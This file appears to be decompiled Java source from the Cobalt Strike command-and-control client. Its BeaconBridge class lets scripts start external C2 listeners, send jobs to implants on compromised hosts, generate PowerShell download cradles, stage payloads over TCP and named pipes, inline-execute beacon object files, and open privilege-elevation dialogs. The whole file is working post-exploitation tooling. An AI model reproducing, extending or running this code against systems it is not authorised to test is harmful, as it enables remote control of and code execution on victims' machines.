package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.dialogs.ElevateDialog;
import aggressor.dialogs.OneLinerDialog;
import beacon.BeaconCommands;
import beacon.EncodedCommandBuilder;
import beacon.PowerShellTasks;
import beacon.TaskBeacon;
import beacon.bof.UserSpecifiedFull;
import common.BeaconEntry;
import common.BeaconOutput;
import common.Callback;
import common.CommonUtils;
import common.ListenerUtils;
import common.Packer;
import common.ScListener;
import common.TeamQueue;
import cortana.Cortana;
import dialog.DialogUtils;
import java.util.LinkedList;
import java.util.Map;
import java.util.Stack;
import sleep.bridges.BridgeUtilities;
import sleep.bridges.SleepClosure;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.interfaces.Predicate;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

public class BeaconBridge implements Function, Loadable, Predicate {
   protected Cortana engine;
   protected TeamQueue conn;
   protected AggressorClient client;

   public BeaconBridge(AggressorClient var1, Cortana var2, TeamQueue var3) {
      this.client = var1;
      this.engine = var2;
      this.conn = var3;
   }

   public void scriptLoaded(ScriptInstance var1) {
      Cortana.put(var1, "&externalc2_start", this);
      Cortana.put(var1, "&beacon_commands", this);
      Cortana.put(var1, "&ssh_commands", this);
      Cortana.put(var1, "&beacon_command_describe", this);
      Cortana.put(var1, "&ssh_command_describe", this);
      Cortana.put(var1, "&beacon_command_detail", this);
      Cortana.put(var1, "&ssh_command_detail", this);
      Cortana.put(var1, "&beacons", this);
      Cortana.put(var1, "&beacon_data", this);
      Cortana.put(var1, "&bdata", this);
      Cortana.put(var1, "&beacon_info", this);
      Cortana.put(var1, "&binfo", this);
      Cortana.put(var1, "&beacon_note", this);
      Cortana.put(var1, "&beacon_remove", this);
      Cortana.put(var1, "&beacon_command_register", this);
      Cortana.put(var1, "&ssh_command_register", this);
      Cortana.put(var1, "&beacon_ids", this);
      Cortana.put(var1, "&beacon_host_script", this);
      Cortana.put(var1, "&beacon_host_imported_script", this);
      Cortana.put(var1, "&beacon_execute_job", this);
      Cortana.put(var1, "&barch", this);
      Cortana.put(var1, "&beacon_stage_tcp", this);
      Cortana.put(var1, "&beacon_stage_pipe", this);
      Cortana.put(var1, "&bof_pack", this);
      Cortana.put(var1, "&beacon_inline_execute", this);
      Cortana.put(var1, "&bls", this);
      Cortana.put(var1, "&bps", this);
      Cortana.put(var1, "&bipconfig", this);
      Cortana.put(var1, "&openOrActivate", this);
      Cortana.put(var1, "&openBypassUACDialog", this);
      Cortana.put(var1, "&openElevateDialog", this);
      Cortana.put(var1, "&openOneLinerDialog", this);
      var1.getScriptEnvironment().getEnvironment().put("-isssh", this);
      var1.getScriptEnvironment().getEnvironment().put("-isbeacon", this);
      var1.getScriptEnvironment().getEnvironment().put("-isadmin", this);
      var1.getScriptEnvironment().getEnvironment().put("-is64", this);
      var1.getScriptEnvironment().getEnvironment().put("-isactive", this);
   }

   public boolean decide(String var1, ScriptInstance var2, Stack var3) {
      String var4 = BridgeUtilities.getString(var3, "");
      BeaconEntry var5 = DataUtils.getBeacon(this.client.getData(), var4);
      if (var5 == null) {
         return false;
      } else if ("-isssh".equals(var1)) {
         return var5.isSSH();
      } else if ("-isbeacon".equals(var1)) {
         return var5.isBeacon();
      } else if ("-isadmin".equals(var1)) {
         return var5.isAdmin();
      } else if ("-is64".equals(var1)) {
         return var5.is64();
      } else {
         return "-isactive".equals(var1) ? var5.isActive() : false;
      }
   }

   public void scriptUnloaded(ScriptInstance var1) {
   }

   public static String[] bids(Stack var0) {
      if (var0.isEmpty()) {
         return new String[0];
      } else {
         Scalar var1 = (Scalar)var0.peek();
         return var1.getArray() != null ? CommonUtils.toStringArray(BridgeUtilities.getArray(var0)) : new String[]{((Scalar)var0.pop()).stringValue()};
      }
   }

   public Scalar evaluate(String var1, ScriptInstance var2, Stack var3) {
      String var11;
      int var24;
      if (var1.equals("&externalc2_start")) {
         var11 = BridgeUtilities.getString(var3, "0.0.0.0");
         var24 = BridgeUtilities.getInt(var3, 2222);
         this.conn.call("exoticc2.start", CommonUtils.args(var11, var24));
         return SleepUtils.getEmptyScalar();
      } else {
         BeaconCommands var34;
         if (var1.equals("&beacon_commands")) {
            var34 = DataUtils.getBeaconCommands(this.client.getData());
            return SleepUtils.getArrayWrapper(var34.commands());
         } else if (var1.equals("&ssh_commands")) {
            var34 = DataUtils.getSSHCommands(this.client.getData());
            return SleepUtils.getArrayWrapper(var34.commands());
         } else {
            BeaconCommands var33;
            if (var1.equals("&beacon_command_describe")) {
               var11 = BridgeUtilities.getString(var3, "");
               var33 = DataUtils.getBeaconCommands(this.client.getData());
               return SleepUtils.getScalar(var33.getDescription(var11));
            } else if (var1.equals("&ssh_command_describe")) {
               var11 = BridgeUtilities.getString(var3, "");
               var33 = DataUtils.getSSHCommands(this.client.getData());
               return SleepUtils.getScalar(var33.getDescription(var11));
            } else if (var1.equals("&beacon_command_detail")) {
               var11 = BridgeUtilities.getString(var3, "");
               var33 = DataUtils.getBeaconCommands(this.client.getData());
               return SleepUtils.getScalar(var33.getDetails(var11));
            } else if (var1.equals("&ssh_command_detail")) {
               var11 = BridgeUtilities.getString(var3, "");
               var33 = DataUtils.getSSHCommands(this.client.getData());
               return SleepUtils.getScalar(var33.getDetails(var11));
            } else {
               final String var12;
               String var19;
               BeaconCommands var31;
               if (var1.equals("&beacon_command_register")) {
                  var11 = BridgeUtilities.getString(var3, "");
                  var12 = BridgeUtilities.getString(var3, "");
                  var19 = BridgeUtilities.getString(var3, "");
                  var31 = DataUtils.getBeaconCommands(this.client.getData());
                  var31.register(var11, var12, var19);
               } else if (var1.equals("&ssh_command_register")) {
                  var11 = BridgeUtilities.getString(var3, "");
                  var12 = BridgeUtilities.getString(var3, "");
                  var19 = BridgeUtilities.getString(var3, "");
                  var31 = DataUtils.getSSHCommands(this.client.getData());
                  var31.register(var11, var12, var19);
               } else {
                  String[] var4;
                  int var6;
                  if (var1.equals("&beacon_note")) {
                     var4 = bids(var3);
                     var12 = BridgeUtilities.getString(var3, "");

                     for(var6 = 0; var6 < var4.length; ++var6) {
                        this.conn.call("beacons.note", CommonUtils.args(var4[var6], var12));
                        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Note(var4[var6], var12)));
                     }
                  } else if (var1.equals("&beacon_remove")) {
                     var4 = bids(var3);

                     for(var24 = 0; var24 < var4.length; ++var24) {
                        this.conn.call("beacons.remove", CommonUtils.args(var4[var24]));
                     }
                  } else {
                     Map var25;
                     if (var1.equals("&beacons")) {
                        var25 = DataUtils.getBeacons(this.client.getData());
                        return CommonUtils.convertAll(new LinkedList(var25.values()));
                     }

                     if (var1.equals("&beacon_ids")) {
                        var25 = DataUtils.getBeacons(this.client.getData());
                        return CommonUtils.convertAll(new LinkedList(var25.keySet()));
                     }

                     int var17;
                     if (var1.equals("&beacon_execute_job")) {
                        var4 = bids(var3);
                        var12 = BridgeUtilities.getString(var3, "");
                        var19 = BridgeUtilities.getString(var3, "");
                        var17 = BridgeUtilities.getInt(var3, 0);

                        for(int var29 = 0; var29 < var4.length; ++var29) {
                           EncodedCommandBuilder var30 = new EncodedCommandBuilder(this.client);
                           var30.setCommand(78);
                           var30.addLengthAndEncodedString(var4[var29], var12);
                           var30.addLengthAndEncodedString(var4[var29], var19);
                           var30.addShort(var17);
                           byte[] var32 = var30.build();
                           this.conn.call("beacons.task", CommonUtils.args(var4[var29], var32));
                        }
                     } else {
                        if (var1.equals("&beacon_host_imported_script")) {
                           var11 = BridgeUtilities.getString(var3, "");
                           return SleepUtils.getScalar((new PowerShellTasks(this.client, var11)).getImportCradle());
                        }

                        if (var1.equals("&beacon_host_script")) {
                           var11 = BridgeUtilities.getString(var3, "");
                           var12 = BridgeUtilities.getString(var3, "");
                           return SleepUtils.getScalar((new PowerShellTasks(this.client, var11)).getScriptCradle(var12));
                        }

                        BeaconEntry var18;
                        if (var1.equals("&barch")) {
                           var11 = BridgeUtilities.getString(var3, "");
                           var18 = DataUtils.getBeacon(this.client.getData(), var11);
                           if (var18 == null) {
                              return SleepUtils.getScalar("x86");
                           }

                           return SleepUtils.getScalar(var18.arch());
                        }

                        if (var1.equals("&beacon_info") || var1.equals("&binfo")) {
                           var11 = BridgeUtilities.getString(var3, "");
                           var18 = DataUtils.getBeacon(this.client.getData(), var11);
                           if (var18 == null) {
                              return SleepUtils.getEmptyScalar();
                           }

                           if (!var3.isEmpty()) {
                              var19 = BridgeUtilities.getString(var3, "");
                              return CommonUtils.convertAll(var18.toMap().get(var19));
                           }

                           return CommonUtils.convertAll(var18.toMap());
                        }

                        if (var1.equals("&beacon_data") || var1.equals("&bdata")) {
                           var11 = BridgeUtilities.getString(var3, "");
                           var12 = BridgeUtilities.getString(var3, "");
                           BeaconEntry var26 = DataUtils.getBeacon(this.client.getData(), var11);
                           return var26 == null ? SleepUtils.getEmptyScalar() : CommonUtils.convertAll(var26.toMap());
                        }

                        final SleepClosure var5;
                        final String var7;
                        if (var1.equals("&bipconfig")) {
                           var4 = bids(var3);
                           var5 = BridgeUtilities.getFunction(var3, var2);

                           for(var6 = 0; var6 < var4.length; ++var6) {
                              var7 = var4[var6];
                              this.conn.call("beacons.task_ipconfig", CommonUtils.args(var4[var6]), new Callback() {
                                 public void result(String var1, Object var2) {
                                    Stack var3 = new Stack();
                                    var3.push(CommonUtils.convertAll(var2));
                                    var3.push(SleepUtils.getScalar(var7));
                                    SleepUtils.runCode((SleepClosure)var5, var1, (ScriptInstance)null, var3);
                                 }
                              });
                           }
                        } else {
                           final String var8;
                           if (var1.equals("&bls")) {
                              var4 = bids(var3);
                              var12 = BridgeUtilities.getString(var3, ".");
                              if (!var3.isEmpty()) {
                                 final SleepClosure var14 = BridgeUtilities.getFunction(var3, var2);

                                 for(var17 = 0; var17 < var4.length; ++var17) {
                                    var8 = var4[var17];
                                    this.conn.call("beacons.task_ls", CommonUtils.args(var4[var17], var12), new Callback() {
                                       public void result(String var1, Object var2) {
                                          Stack var3 = new Stack();
                                          var3.push(CommonUtils.convertAll(var2));
                                          var3.push(SleepUtils.getScalar(var12));
                                          var3.push(SleepUtils.getScalar(var8));
                                          SleepUtils.runCode((SleepClosure)var14, var1, (ScriptInstance)null, var3);
                                       }
                                    });
                                 }
                              } else {
                                 TaskBeacon var15 = new TaskBeacon(this.client, this.client.getData(), this.conn, var4);
                                 var15.Ls(var12);
                              }
                           } else if (var1.equals("&bps")) {
                              var4 = bids(var3);
                              if (var3.isEmpty()) {
                                 TaskBeacon var13 = new TaskBeacon(this.client, this.client.getData(), this.conn, var4);
                                 var13.Ps();
                              } else {
                                 var5 = BridgeUtilities.getFunction(var3, var2);

                                 for(var6 = 0; var6 < var4.length; ++var6) {
                                    var7 = var4[var6];
                                    this.conn.call("beacons.task_ps", CommonUtils.args(var4[var6]), new Callback() {
                                       public void result(String var1, Object var2) {
                                          Stack var3 = new Stack();
                                          var3.push(CommonUtils.convertAll(var2));
                                          var3.push(SleepUtils.getScalar(var7));
                                          SleepUtils.runCode((SleepClosure)var5, var1, (ScriptInstance)null, var3);
                                       }
                                    });
                                 }
                              }
                           } else {
                              TaskBeacon var10;
                              if (var1.equals("&beacon_stage_tcp")) {
                                 var11 = BridgeUtilities.getString(var3, "");
                                 var12 = BridgeUtilities.getString(var3, "127.0.0.1");
                                 var6 = BridgeUtilities.getInt(var3, 0);
                                 var7 = BridgeUtilities.getString(var3, "");
                                 var8 = BridgeUtilities.getString(var3, "x86");
                                 ScListener var9 = ListenerUtils.getListener(this.client, var7);
                                 var10 = new TaskBeacon(this.client, this.client.getData(), this.conn, new String[]{var11});
                                 var10.StageTCP(var11, var12, var6, var8, var9);
                              } else if (var1.equals("&beacon_stage_pipe")) {
                                 var11 = BridgeUtilities.getString(var3, "");
                                 var12 = BridgeUtilities.getString(var3, "127.0.0.1");
                                 var19 = BridgeUtilities.getString(var3, "");
                                 var7 = BridgeUtilities.getString(var3, "x86");
                                 ScListener var20 = ListenerUtils.getListener(this.client, var19);
                                 String var27 = var20.getConfig().getStagerPipe();
                                 var10 = new TaskBeacon(this.client, this.client.getData(), this.conn, new String[]{var11});
                                 var10.StagePipe(var11, var12, var27, var7, var20);
                              } else if (var1.equals("&openOrActivate")) {
                                 var4 = bids(var3);
                                 if (var4.length == 1) {
                                    DialogUtils.openOrActivate(this.client, var4[0]);
                                 }
                              } else {
                                 if (var1.equals("&openBypassUACDialog")) {
                                    throw new RuntimeException(var1 + " was removed in Cobalt Strike 4.1");
                                 }

                                 if (var1.equals("&openElevateDialog")) {
                                    var4 = bids(var3);
                                    (new ElevateDialog(this.client, var4)).show();
                                 } else if (var1.equals("&openOneLinerDialog")) {
                                    var4 = bids(var3);
                                    (new OneLinerDialog(this.client, var4)).show();
                                 } else {
                                    if (var1.equals("&bof_pack")) {
                                       var11 = BridgeUtilities.getString(var3, "");
                                       var12 = BridgeUtilities.getString(var3, "");
                                       Packer var21 = new Packer();

                                       for(var17 = 0; var17 < var12.length(); ++var17) {
                                          char var28 = var12.charAt(var17);
                                          if (var28 != ' ') {
                                             if (var3.isEmpty()) {
                                                throw new RuntimeException("No argument corresponds to '" + var28 + "'");
                                             }

                                             if (var28 == 'b') {
                                                var21.addLengthAndString(BridgeUtilities.getString(var3, ""));
                                             } else if (var28 == 'i') {
                                                var21.addInt(BridgeUtilities.getInt(var3, 0));
                                             } else if (var28 == 's') {
                                                var21.addShort((short)BridgeUtilities.getInt(var3, 0));
                                             } else if (var28 == 'z') {
                                                var21.addLengthAndEncodedStringASCIIZ(this.client, var11, BridgeUtilities.getString(var3, ""));
                                             } else {
                                                if (var28 != 'Z') {
                                                   throw new RuntimeException("Invalid character in BOF: '" + var28 + "'");
                                                }

                                                var21.addLengthAndWideStringASCIIZ(BridgeUtilities.getString(var3, ""));
                                             }
                                          }
                                       }

                                       return SleepUtils.getScalar(var21.getBytes());
                                    }

                                    if (var1.equals("&beacon_inline_execute")) {
                                       var11 = BridgeUtilities.getString(var3, "");
                                       byte[] var16 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
                                       var19 = BridgeUtilities.getString(var3, "");
                                       byte[] var22 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
                                       UserSpecifiedFull var23 = new UserSpecifiedFull(this.client, var16, var19, var22);
                                       var23.go(var11);
                                    }
                                 }
                              }
                           }
                        }
                     }
                  }
               }

               return SleepUtils.getEmptyScalar();
            }
         }
      }
   }
}
